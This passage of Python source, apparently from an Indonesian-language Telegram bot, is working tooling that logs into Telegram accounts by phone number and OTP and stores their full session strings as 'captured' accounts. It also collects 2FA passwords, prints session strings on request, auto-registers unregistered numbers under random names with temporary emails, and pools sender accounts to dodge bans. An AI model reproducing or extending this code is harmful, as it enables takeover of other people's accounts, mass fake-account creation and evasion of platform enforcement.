        doc = msg.reply_to_message.document
    elif msg.document:
        doc = msg.document
    if not doc:
        return None, "Tidak ada file"
    if doc.file_size and doc.file_size > 10 * 1024 * 1024:
        return None, "File terlalu besar (max 10MB)"
    tg_file = await doc.get_file()
    ba = await tg_file.download_as_bytearray()
    try:
        content = bytes(ba).decode('utf-8', errors='ignore')
    except Exception:
        content = bytes(ba).decode('latin-1', errors='ignore')
    raw_numbers = re.split(r'[\s,;|]+', content)
    phones = []
    for raw in raw_numbers:
        cleaned = _tgcheck_normalize_phone(raw)
        if 7 <= len(cleaned) <= 15:
            phones.append(cleaned)
    return list(dict.fromkeys(phones)), None


async def addsender_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/addsender 628xxx — login sender via phone+OTP (semua user)."""
    user_id = update.effective_user.id
    if not is_allowed_user(user_id):
        await update.message.reply_text(
            _screen('ADD SENDER', f"{em(E2,'❌')} Kamu belum terdaftar. Hubungi owner."),
            parse_mode=ParseMode.HTML,
        )
        return
    if not TELETHON_OK:
        await update.message.reply_text(
            _screen('ADD SENDER', f"{em(E2,'❌')} Telethon belum terinstall."),
            parse_mode=ParseMode.HTML,
        )
        return

    raw = (update.message.text or '')
    raw = re.sub(r'^/addsender\s*', '', raw, flags=re.IGNORECASE).strip()
    phone = _tgcheck_normalize_phone(raw)
    if not phone or len(phone) < 7:
        await update.message.reply_text(
            _screen('ADD SENDER', (
                f"{em(CE_TELEGRAM,'💬')} <b>TAMBAH SENDER</b>\n\n"
                f"Sender = akun Telegram beneran buat mode DETAIL.\n\n"
                f"<b>Cara:</b>\n"
                f"  <code>/addsender 628123456789</code>\n\n"
                f"Bot bakal kirim OTP ke akun itu, terus kamu ketik kodenya di sini.\n\n"
                f"{em(E3,'⚠️')} <i>Pakai nomor yang kamu kontrol. Resiko limit ada kalau dipakai berlebihan.</i>"
            ), 'Home › Add Sender'),
            parse_mode=ParseMode.HTML,
        )
        return

    msg = await update.message.reply_text(
        _screen('ADD SENDER', f"{em(CE_LOADING,'🟠')} <i>Mengirim OTP ke +{phone}...</i>"),
        parse_mode=ParseMode.HTML,
    )

    client = TelegramClient(StringSession(), TG_API_ID, TG_API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=15)
        sent = await asyncio.wait_for(
            client.send_code_request('+' + phone), timeout=30
        )
        otp_type = type(sent.type).__name__ if sent.type else 'Unknown'
        _sender_login_tmp[user_id] = {
            'client': client,
            'phone': phone,
            'hash': sent.phone_code_hash,
        }
        context.user_data['awaiting_sender_otp'] = True

        otp_hint = '📲 App' if 'App' in otp_type else ('📨 SMS' if 'Sms' in otp_type else f'📞 {otp_type}')
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E1,'✅')} <b>OTP terkirim ke +{phone}</b>\n\n"
                f"  Tipe: <b>{otp_hint}</b>\n\n"
                f"Ketik kode OTP yang masuk (format: <code>12345</code> atau <code>1 2 3 4 5</code> kalau Telegram blokir).\n\n"
                f"{em(CE_WAKTU,'⏲')} <i>Ketik /cancelsender untuk batal.</i>"
            ), 'Home › Add Sender › OTP'),
            parse_mode=ParseMode.HTML,
        )
    except PhoneNumberBannedError:
        try: await client.disconnect()
        except: pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E2,'🚫')} <b>Nomor +{phone} di-BAN Telegram</b>\n\n"
                f"Pakai nomor lain. Yang ini permanently banned."
            )),
            parse_mode=ParseMode.HTML,
        )
    except PhoneNumberInvalidError:
        try: await client.disconnect()
        except: pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E2,'❌')} <b>Format nomor invalid</b>\n\n"
                f"Pastikan nomor pakai country code, misal:\n"
                f"  <code>/addsender 628123456789</code>"
            )),
            parse_mode=ParseMode.HTML,
        )
    except PhoneNumberFloodError:
        try: await client.disconnect()
        except: pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E3,'🌊')} <b>Nomor +{phone} kena Flood</b>\n\n"
                f"Nomor ini udah keseringan request OTP (limit 24 jam Telegram).\n\n"
                f"<b>Solusi:</b>\n"
                f"  • Tunggu 12-24 jam\n"
                f"  • Pake nomor lain dulu"
            )),
            parse_mode=ParseMode.HTML,
        )
    except FloodWaitError as e:
        try: await client.disconnect()
        except: pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        hours = e.seconds // 3600
        mins = (e.seconds % 3600) // 60
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E3,'⏳')} <b>FloodWait global</b>\n\n"
                f"Telegram bilang tunggu <b>{hours}h {mins}m</b> ({e.seconds}s).\n\n"
                f"API key kebanyakan dipakai. Coba lagi nanti, atau pake nomor di device sendiri (bukan via API)."
            )),
            parse_mode=ParseMode.HTML,
        )
    except asyncio.TimeoutError:
        try: await client.disconnect()
        except: pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E2,'⏱')} <b>Timeout konek ke Telegram</b>\n\n"
                f"Connection drop / lambat. Coba ulang:\n"
                f"  <code>/addsender {phone}</code>"
            )),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        try: await client.disconnect()
        except: pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        err_name = type(e).__name__
        err_msg = str(e)[:120]
        await msg.edit_text(
            _screen('ADD SENDER', (
                f"{em(E2,'❌')} <b>Gagal kirim OTP</b>\n\n"
                f"  Tipe: <code>{err_name}</code>\n"
                f"  Pesan: <code>{html.escape(err_msg)}</code>\n\n"
                f"<i>Coba ulang: <code>/addsender {phone}</code></i>"
            )),
            parse_mode=ParseMode.HTML,
        )


async def _sender_finish_otp(update, context, code_text):
    """Dipanggil dari handle_message saat user kirim OTP/2FA untuk sender."""
    user_id = update.effective_user.id
    tmp = _sender_login_tmp.get(user_id)
    if not tmp:
        context.user_data.pop('awaiting_sender_otp', None)
        context.user_data.pop('awaiting_sender_2fa', None)
        return

    client = tmp['client']
    phone = tmp['phone']

    # Mode 2FA password
    if context.user_data.get('awaiting_sender_2fa'):
        try:
            await asyncio.wait_for(client.sign_in(password=code_text.strip()), timeout=30)
        except asyncio.TimeoutError:
            await update.message.reply_text(
                _screen('ADD SENDER', f"{em(E2,'❌')} Timeout 2FA — coba lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        except Exception as e:
            await update.message.reply_text(
                _screen('ADD SENDER', f"{em(E2,'❌')} Password 2FA salah: {html.escape(str(e)[:80])}\n\nCoba ketik ulang."),
                parse_mode=ParseMode.HTML,
            )
            return
        await _sender_save_after_login(update, context, client, phone)
        return

    # Mode OTP
    code = re.sub(r'[^\d]', '', code_text)
    if not code:
        return
    try:
        await asyncio.wait_for(
            client.sign_in(phone='+' + phone, code=code, phone_code_hash=tmp['hash']),
            timeout=30
        )
    except SessionPasswordNeededError:
        context.user_data.pop('awaiting_sender_otp', None)
        context.user_data['awaiting_sender_2fa'] = True
        await update.message.reply_text(
            _screen('ADD SENDER', (
                f"{em(E3,'🔒')} <b>Akun ini punya 2FA!</b>\n\n"
                f"Ketik password 2FA (cloud password) akun tersebut."
            ), 'Home › Add Sender › 2FA'),
            parse_mode=ParseMode.HTML,
        )
        return
    except PhoneCodeInvalidError:
        await update.message.reply_text(
            _screen('ADD SENDER', f"{em(E2,'❌')} Kode OTP salah. Ketik ulang."),
            parse_mode=ParseMode.HTML,
        )
        return
    except Exception as e:
        await update.message.reply_text(
            _screen('ADD SENDER', f"{em(E2,'❌')} Gagal login: {html.escape(str(e)[:100])}"),
            parse_mode=ParseMode.HTML,
        )
        return

    await _sender_save_after_login(update, context, client, phone)


async def _sender_save_after_login(update, context, client, phone):
    """Simpan StringSession sender setelah login sukses."""
    user_id = update.effective_user.id
    try:
        me = await client.get_me()
        name = (me.first_name or '') + ((' ' + me.last_name) if me.last_name else '')
        session_str = client.session.save()
        _add_to_pool(user_id, phone, session_str, name.strip() or phone)
        total, active = _pool_count(user_id)

        # Auto-start userbot untuk sender baru
        _ub_status = "❌ gagal"
        try:
            cur.execute("SELECT id FROM tgcheck_pool WHERE user_id=? AND phone=?", (user_id, phone))
            _pid_row = cur.fetchone()
            if _pid_row:
                _ub_ok = await _start_sender_userbot(_pid_row[0], session_str, phone, name.strip() or phone, user_id)
                _ub_status = "✅ aktif — ketik /fix di Saved Messages" if _ub_ok else "❌ gagal start"
        except Exception as _ub_e:
            print(f"[USERBOT] auto-start error: {_ub_e}")

        await update.message.reply_text(
            _screen('ADD SENDER', (
                f"{em(E1,'✅')} <b>Sender ditambahkan ke pool!</b>\n\n"
                f"  👤 <b>Nama:</b>  {html.escape(name.strip() or '-')}\n"
                f"  📞 <b>Nomor:</b>  <code>+{phone}</code>\n"
                f"  🆔 <b>ID:</b>  <code>{me.id}</code>\n\n"
                f"  {em(CE_TELEGRAM,'💎')} <b>Total pool:</b>  {total} sender ({active} siap)\n"
                f"  🤖 <b>Userbot:</b>  {_ub_status}\n\n"
                f"Tambah lagi biar makin anti-ban: <code>/addsender 628xxx</code>"
            ), 'Home › Add Sender › Sukses'),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await update.message.reply_text(
            _screen('ADD SENDER', f"{em(E2,'❌')} Gagal simpan sender: {html.escape(str(e)[:100])}"),
            parse_mode=ParseMode.HTML,
        )
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass
        _sender_login_tmp.pop(user_id, None)
        context.user_data.pop('awaiting_sender_otp', None)
        context.user_data.pop('awaiting_sender_2fa', None)


async def cancelsender_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/cancelsender — batalkan proses login sender."""
    user_id = update.effective_user.id
    tmp = _sender_login_tmp.pop(user_id, None)
    if tmp:
        try:
            await tmp['client'].disconnect()
        except Exception:
            pass
    context.user_data.pop('awaiting_sender_otp', None)
    context.user_data.pop('awaiting_sender_2fa', None)
    await update.message.reply_text(
        _screen('ADD SENDER', f"{em(E2,'❌')} Proses login sender dibatalkan."),
        parse_mode=ParseMode.HTML,
    )


async def _login_finish_code(update, context, text):
    """User ketik phone:code — sign_in dengan hash tersimpan."""
    user_id = update.effective_user.id
    parts = text.strip().split(':', 1)
    if len(parts) != 2:
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E3,'⚠️')} Format: <code>nomor:kode</code>"),
            parse_mode=ParseMode.HTML,
        )
        return

    phone_raw, code = parts[0].strip(), parts[1].strip()
    phone = _tgcheck_normalize_phone(phone_raw)
    if not phone or not code:
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E3,'⚠️')} Nomor/kode kosong."),
            parse_mode=ParseMode.HTML,
        )
        return

    pending = _tgcheck_login_pending.get(user_id, {})
    entry = pending.get(phone)
    if not entry:
        await update.message.reply_text(
            _screen('LOGIN', (
                f"{em(E2,'❌')} Hash untuk <code>+{phone}</code> tidak ditemukan.\n\n"
                f"Mungkin expired (5 menit) atau belum di-check."
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    if int(time.time()) > entry['expires']:
        pending.pop(phone, None)
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E2,'❌')} Hash expired. Jalankan /check ulang untuk nomor ini."),
            parse_mode=ParseMode.HTML,
        )
        return

    client = TelegramClient(StringSession(entry['session']), TG_API_ID, TG_API_HASH)
    try:
        await client.connect()
        await client.sign_in(phone='+' + phone, code=code, phone_code_hash=entry['hash'])
        me = await client.get_me()
        session_str = client.session.save()

        # Simpan ke DB captured
        fname = me.first_name or ''
        lname = me.last_name or ''
        uname = me.username or ''
        prem = 1 if getattr(me, 'premium', False) else 0
        try:
            cur.execute(
                "INSERT INTO tgcheck_captured (user_id, phone, string_session, tg_id, first_name, last_name, username, premium) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (user_id, phone, session_str, me.id, fname, lname, uname, prem)
            )
            conn.commit()
        except Exception:
            pass

        pending.pop(phone, None)
        name = f"{fname} {lname}".strip() or '-'

        await update.message.reply_text(
            _screen('LOGIN', (
                f"{em(E1,'✅')} <b>LOGIN BERHASIL!</b>\n\n"
                f"  📞 <code>+{phone}</code>\n"
                f"  👤 {html.escape(name)}\n"
                f"  🆔 <code>{me.id}</code>\n"
                f"  @ {html.escape(uname) if uname else '-'}\n"
                f"  ⭐ {'Premium' if prem else 'Free'}\n\n"
                f"{em(CE_TELEGRAM,'🔓')} Session disimpan. Lihat di /sessions."
            ), 'Home › Login › Berhasil'),
            parse_mode=ParseMode.HTML,
        )
    except SessionPasswordNeededError:
        # 2FA aktif — minta password
        session_str = client.session.save()
        context.user_data[f'tgcheck_login_2fa_{user_id}'] = {
            'session': session_str,
            'phone': phone,
        }
        await update.message.reply_text(
            _screen('LOGIN', (
                f"{em(E3,'🔐')} <b>Akun pakai 2FA!</b>\n\n"
                f"Ketik password 2FA untuk <code>+{phone}</code>:\n\n"
                f"<i>Atau ketik</i> <code>skip</code> <i>untuk batal.</i>"
            ), 'Home › Login › 2FA'),
            parse_mode=ParseMode.HTML,
        )
    except PhoneNumberUnoccupiedError:
        # Nomor belum register — auto sign-up!
        try:
            import random as _rnd
            _names = ['Alex', 'Sam', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Jamie']
            fname = _rnd.choice(_names)
            lname = str(_rnd.randint(10, 99))

            try:
                await client.sign_up(code=code, first_name=fname, last_name=lname)
            except Exception as signup_ex:
                err_str = str(signup_ex).lower()
                # Telegram minta email verification
                if 'email' in err_str or 'EMAIL' in str(type(signup_ex).__name__):
                    await update.message.reply_text(
                        _screen('LOGIN', f"{em(CE_LOADING,'📧')} Telegram minta email... auto-generate via emailqu..."),
                        parse_mode=ParseMode.HTML,
                    )
                    # Generate temp email
                    temp_email, _ = emailqu_get_temp_email()
                    if not temp_email:
                        temp_email = f"tg_{phone[-6:]}_{_rnd.randint(100,999)}@capemain.games"

                    # Kirim email ke Telegram
                    from telethon.tl.functions.account import SendVerifyEmailCodeRequest, VerifyEmailRequest
                    from telethon.tl.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode
                    try:
                        email_result = await client(SendVerifyEmailCodeRequest(
                            purpose=EmailVerifyPurposeLoginSetup(
                                phone_number='+' + phone,
                                phone_code_hash=entry['hash'],
                            ),
                            email=temp_email,
                        ))
                        await update.message.reply_text(
                            _screen('LOGIN', f"{em(CE_LOADING,'📧')} Email dikirim ke <code>{temp_email}</code>. Polling OTP..."),
                            parse_mode=ParseMode.HTML,
                        )
                        # Poll emailqu inbox
                        import asyncio as _aio
                        email_body = await _aio.get_event_loop().run_in_executor(
                            None, emailqu_poll_inbox, temp_email, 60, 3
                        )
                        email_code = emailqu_extract_otp(email_body) if email_body else None
                        if not email_code:
                            raise Exception("Email OTP tidak diterima dalam 60 detik")

                        # Verify email
                        await client(VerifyEmailRequest(
                            purpose=EmailVerifyPurposeLoginSetup(
                                phone_number='+' + phone,
                                phone_code_hash=entry['hash'],
                            ),
                            verification=EmailVerificationCode(code=email_code),
                        ))
                        # Retry sign-up after email verified
                        await client.sign_up(code=code, first_name=fname, last_name=lname)
                    except Exception as email_err:
                        raise Exception(f"Email verify: {str(email_err)[:80]}")
                else:
                    raise signup_ex

            me = await client.get_me()
            session_str = client.session.save()

            uname = me.username or ''
            prem = 1 if getattr(me, 'premium', False) else 0
            try:
                cur.execute(
                    "INSERT INTO tgcheck_captured (user_id, phone, string_session, tg_id, first_name, last_name, username, premium) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_id, phone, session_str, me.id, fname, lname, uname, prem)
                )
                conn.commit()
            except Exception:
                pass

            pending.pop(phone, None)
            await update.message.reply_text(
                _screen('LOGIN', (
                    f"{em(E1,'✅')} <b>SIGN-UP BERHASIL! (Akun baru)</b>\n\n"
                    f"  📞 <code>+{phone}</code>\n"
                    f"  👤 {fname} {lname}\n"
                    f"  🆔 <code>{me.id}</code>\n\n"
                    f"{em(CE_TELEGRAM,'🔓')} Akun baru dibuat & session disimpan."
                ), 'Home › Login › SignUp'),
                parse_mode=ParseMode.HTML,
            )
        except Exception as signup_err:
            await update.message.reply_text(
                _screen('LOGIN', (
                    f"{em(E3,'⚠️')} <b>Nomor belum register — sign-up gagal:</b>\n"
                    f"<code>{html.escape(str(signup_err)[:100])}</code>"
                )),
                parse_mode=ParseMode.HTML,
            )
    except PhoneCodeInvalidError:
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E2,'❌')} Kode salah. Coba lagi: <code>{phone}:kode_baru</code>"),
            parse_mode=ParseMode.HTML,
        )
    except PhoneCodeExpiredError:
        pending.pop(phone, None)
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E2,'❌')} Kode expired. Jalankan /check ulang."),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E2,'❌')} Error: {html.escape(str(e)[:100])}"),
            parse_mode=ParseMode.HTML,
        )
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def _login_finish_2fa(update, context, password_text):
    """Handle 2FA password input untuk login mode."""
    user_id = update.effective_user.id
    data = context.user_data.get(f'tgcheck_login_2fa_{user_id}')
    if not data:
        context.user_data.pop(f'tgcheck_login_2fa_{user_id}', None)
        return

    if password_text.strip().lower() == 'skip':
        context.user_data.pop(f'tgcheck_login_2fa_{user_id}', None)
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E3,'⚠️')} 2FA dilewati. Akun tidak di-capture."),
            parse_mode=ParseMode.HTML,
        )
        return

    phone = data['phone']
    client = TelegramClient(StringSession(data['session']), TG_API_ID, TG_API_HASH)
    try:
        await client.connect()
        await client.sign_in(password=password_text.strip())
        me = await client.get_me()
        session_str = client.session.save()

        fname = me.first_name or ''
        lname = me.last_name or ''
        uname = me.username or ''
        prem = 1 if getattr(me, 'premium', False) else 0
        try:
            cur.execute(
                "INSERT INTO tgcheck_captured (user_id, phone, string_session, tg_id, first_name, last_name, username, premium) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (user_id, phone, session_str, me.id, fname, lname, uname, prem)
            )
            conn.commit()
        except Exception:
            pass

        context.user_data.pop(f'tgcheck_login_2fa_{user_id}', None)
        name = f"{fname} {lname}".strip() or '-'

        await update.message.reply_text(
            _screen('LOGIN', (
                f"{em(E1,'✅')} <b>2FA BERHASIL — CAPTURED!</b>\n\n"
                f"  📞 <code>+{phone}</code>\n"
                f"  👤 {html.escape(name)}\n"
                f"  🆔 <code>{me.id}</code>\n"
                f"  @ {html.escape(uname) if uname else '-'}\n"
                f"  ⭐ {'Premium' if prem else 'Free'}\n\n"
                f"{em(CE_TELEGRAM,'🔓')} Session disimpan. Lihat di /sessions."
            ), 'Home › Login › Berhasil'),
            parse_mode=ParseMode.HTML,
        )
    except PasswordHashInvalidError:
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E2,'❌')} Password salah. Coba lagi atau ketik <code>skip</code>."),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        context.user_data.pop(f'tgcheck_login_2fa_{user_id}', None)
        await update.message.reply_text(
            _screen('LOGIN', f"{em(E2,'❌')} Error 2FA: {html.escape(str(e)[:80])}"),
            parse_mode=ParseMode.HTML,
        )
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def sessions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sessions — list akun yang berhasil di-capture via LOGIN mode."""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(
            _screen('SESSIONS', f"{em(E2,'❌')} Hanya owner."),
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        cur.execute(
            "SELECT id, phone, tg_id, first_name, last_name, username, premium, captured_at "
            "FROM tgcheck_captured WHERE user_id=? ORDER BY id DESC LIMIT 30",
            (user_id,)
        )
        rows = cur.fetchall()
    except Exception:
        rows = []

    if not rows:
        await update.message.reply_text(
            _screen('SESSIONS', (
                f"{em(E3,'⚠️')} <b>Belum ada akun captured.</b>\n\n"
                f"Gunakan /check → 🔓 LOGIN → ketik nomor:kode"
            ), 'Home › Sessions'),
            parse_mode=ParseMode.HTML,
        )
        return

    body = [f"{em(CE_TELEGRAM,'🔓')} <b>CAPTURED ACCOUNTS</b>  ({len(rows)})\n"]
    for r in rows:
        sid, phone, tg_id, fn, ln, uname, prem, cat = r
        name = f"{fn or ''} {ln or ''}".strip() or '-'
        prem_badge = ' ⭐' if prem else ''
        body.append(
            f"\n<b>#{sid}</b> {html.escape(name[:18])}{prem_badge}\n"
            f"  📞 <code>+{phone}</code>  🆔 <code>{tg_id}</code>\n"
            f"  @ {html.escape(uname) if uname else '-'}"
        )

    body.append(f"\n\n<i>Ketik</i> <code>/session ID</code> <i>untuk lihat detail/session string.</i>")

    await update.message.reply_text(
        _screen('SESSIONS', '\n'.join(body), 'Home › Sessions'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("HAPUS SEMUA", callback_data=f"sessions_delall_{user_id}",
                                 icon_custom_emoji_id=E2, style="danger"),
        ]]),
    )


async def session_detail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/session ID — lihat detail + session string akun captured."""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(
            _screen('SESSION', f"{em(E2,'❌')} Hanya owner."),
            parse_mode=ParseMode.HTML,
        )
        return

    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text(
            _screen('SESSION', f"{em(E3,'⚠️')} Format: <code>/session 1</code>"),
            parse_mode=ParseMode.HTML,
        )
        return

    sid = int(args[0])
    try:
        cur.execute(
            "SELECT phone, string_session, tg_id, first_name, last_name, username, premium, captured_at "
            "FROM tgcheck_captured WHERE user_id=? AND id=?",
            (user_id, sid)
        )
        row = cur.fetchone()
    except Exception:
        row = None

    if not row:
        await update.message.reply_text(
            _screen('SESSION', f"{em(E2,'❌')} ID #{sid} tidak ditemukan."),
            parse_mode=ParseMode.HTML,
        )
        return

    phone, session, tg_id, fn, ln, uname, prem, cat = row
    name = f"{fn or ''} {ln or ''}".strip() or '-'

    await update.message.reply_text(
        _screen('SESSION', (
            f"{em(CE_TELEGRAM,'🔓')} <b>CAPTURED #{sid}</b>\n\n"
            f"  📞 <code>+{phone}</code>\n"
            f"  👤 {html.escape(name)}\n"
            f"  🆔 <code>{tg_id}</code>\n"
            f"  @ {html.escape(uname) if uname else '-'}\n"
            f"  ⭐ {'Premium' if prem else 'Free'}\n"
            f"  📅 {cat}\n\n"
            f"{'─'*30}\n"
            f"<b>SESSION STRING:</b>\n"
            f"<code>{session}</code>"
        ), 'Home › Sessions › Detail'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("HAPUS", callback_data=f"sessions_del_{sid}_{user_id}",
                                 icon_custom_emoji_id=E2, style="danger"),
        ]]),
    )


async def sender_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sender — kelola sender (lihat/hapus/cek status)."""
    user_id = update.effective_user.id
    if not is_allowed_user(user_id):
        await update.message.reply_text(
            _screen('SENDER', f"{em(E2,'❌')} Kamu belum terdaftar. Hubungi owner."),
            parse_mode=ParseMode.HTML,
        )
        return

    pool = _get_pool(user_id, include_dead=True)
    if not pool:
        await update.message.reply_text(
            _screen('SENDER', (
                f"{em(E3,'⚠️')} <b>Belum ada sender.</b>\n\n"
                f"Tambah dengan: <code>/addsender 628xxx</code>\n\n"
                f"{em(CE_TELEGRAM,'💎')} <i>Makin banyak sender, makin anti-ban.</i>"
            ), 'Home › Sender'),
            parse_mode=ParseMode.HTML,
        )
        return

    now = int(time.time())
    total, active = _pool_count(user_id)
    body = [
        f"{em(CE_TELEGRAM,'💬')} <b>SENDER POOL</b>  ({total} total · {active} siap)\n"
    ]
    for i, s in enumerate(pool, 1):
        if s['status'] == 'dead':
            badge = f"{em(E2,'💀')} DEAD"
        elif s['flood_until'] > now:
            mins = int((s['flood_until'] - now) / 60) + 1
            badge = f"{em(E3,'🧊')} COOLDOWN {mins}m"
        else:
            badge = f"{em(E1,'✅')} SIAP"
        nm = html.escape((s['name'] or '-')[:20])
        body.append(
            f"\n<b>{i}.</b> {nm}\n"
            f"   📞 <code>+{s['phone']}</code>\n"
            f"   {badge}"
        )

    await update.message.reply_text(
        _screen('SENDER', '\n'.join(body), 'Home › Sender'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("CEK SEMUA", callback_data=f"sender_checkall_{user_id}",
                                     icon_custom_emoji_id=E1, style="success"),
                InlineKeyboardButton("HAPUS MATI", callback_data=f"sender_deldead_{user_id}",
                                     icon_custom_emoji_id=E3, style="primary"),
            ],
            [
                InlineKeyboardButton("HAPUS SEMUA", callback_data=f"sender_delall_{user_id}",
                                     icon_custom_emoji_id=E2, style="danger"),
            ],
        ]),
    )


async def _handle_loginexp_callback(query, data, user_id, context):
    """Handle loginexp_ callbacks: export nomor by OTP type ke TXT."""
    if data.startswith('loginexp_done_'):
        await query.answer("Login mode selesai")
        context.user_data.pop(f'tgcheck_login_mode_{user_id}', None)
        context.user_data.pop(f'tgcheck_login_results_{user_id}', None)
        _tgcheck_login_pending.pop(user_id, None)
        try:
            await query.message.edit_text(
                _screen('LOGIN', f"{em(E1,'✅')} Login mode selesai."),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    results = context.user_data.get(f'tgcheck_login_results_{user_id}', {})
    sms_list = results.get('sms', [])
    app_list = results.get('app', [])

    if data.startswith('loginexp_sms_'):
        phones = sms_list
        label = 'SMS'
    elif data.startswith('loginexp_app_'):
        phones = app_list
        label = 'APP'
    elif data.startswith('loginexp_all_'):
        phones = sms_list + app_list
        label = 'ALL'
    else:
        return

    await query.answer(f"Export {label}: {len(phones)} nomor")

    if not phones:
        try:
            await query.message.reply_text(
                _screen('EXPORT', f"{em(E3,'⚠️')} Tidak ada nomor {label}."),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    # Bikin file TXT
    content = '\n'.join(f'+{p}' for p in phones)
    fname = f"login_{label.lower()}_{user_id}_{int(time.time())}.txt"
    fpath = os.path.join(os.path.dirname(__file__) or '.', fname)
    try:
        with open(fpath, 'w') as f:
            f.write(content)
        await query.message.reply_document(
            document=open(fpath, 'rb'),
            filename=fname,
            caption=f"📋 {label}: {len(phones)} nomor ({', '.join(phones[:3])}...)",
        )
    except Exception as e:
        try:
            await query.message.reply_text(f"Error export: {str(e)[:80]}")
        except Exception:
            pass
    finally:
        try:
            os.remove(fpath)
        except Exception:
            pass


async def _handle_sessions_callback(query, data, user_id):
    """Handle sessions_del_ and sessions_delall_ callbacks."""
    if data.startswith('sessions_delall_'):
        await query.answer("Semua captured dihapus!")
        try:
            cur.execute("DELETE FROM tgcheck_captured WHERE user_id=?", (user_id,))
            conn.commit()
        except Exception:
            pass
        try:
            await query.message.edit_text(
                _screen('SESSIONS', f"{em(E1,'✅')} <b>Semua akun captured dihapus.</b>"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    if data.startswith('sessions_del_'):
        # format: sessions_del_{id}_{user_id}
        parts = data.split('_')
        if len(parts) >= 3:
            sid = parts[2]
            await query.answer(f"#{sid} dihapus!")
            try:
                cur.execute("DELETE FROM tgcheck_captured WHERE user_id=? AND id=?", (user_id, sid))
                conn.commit()
            except Exception:
                pass
            try:
                await query.message.edit_text(
                    _screen('SESSIONS', f"{em(E1,'✅')} Captured #{sid} dihapus."),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        return


async def _handle_sender_callback(query, data, user_id, context):
    """Handle sender_* callbacks: cek semua, hapus mati, hapus semua."""
    if data.startswith('sender_delall_'):
        await query.answer("Semua sender dihapus!")
        _delete_all_senders(user_id)
        try:
            await query.message.edit_text(
                _screen('SENDER', f"{em(E1,'✅')} <b>Semua sender dihapus.</b>\n\nTambah lagi via /addsender."),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    if data.startswith('sender_deldead_'):
        await query.answer("Sender mati dihapus!")
        try:
            cur.execute("DELETE FROM tgcheck_pool WHERE user_id=? AND status='dead'", (user_id,))
            conn.commit()
            n = cur.rowcount
        except Exception:
            n = 0
        total, active = _pool_count(user_id)
        try:
            await query.message.edit_text(
                _screen('SENDER', (
                    f"{em(E1,'✅')} <b>{n} sender mati dihapus.</b>\n\n"
                    f"Sisa pool: <b>{total}</b> ({active} siap)"
                ), 'Home › Sender'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        return

    if data.startswith('sender_checkall_'):
        await query.answer("Mengecek semua sender...")
        pool = _get_pool(user_id, include_dead=True)
        if not pool:
            try:
                await query.message.edit_text(
                    _screen('SENDER', f"{em(E2,'❌')} Pool kosong."),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            return

        results = []
        for s in pool:
            client = TelegramClient(StringSession(s['session']), TG_API_ID, TG_API_HASH)
            alive = False
            try:
                await client.connect()
                if await client.is_user_authorized():
                    await client.get_me()
                    alive = True
            except Exception:
                alive = False
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass
            if alive:
                _mark_sender_active(s['id'])
            else:
                _mark_sender_dead(s['id'])
            badge = f"{em(E1,'✅')} HIDUP" if alive else f"{em(E2,'💀')} MATI"
            results.append(f"  {html.escape((s['name'] or '-')[:18])} <code>+{s['phone']}</code> — {badge}")

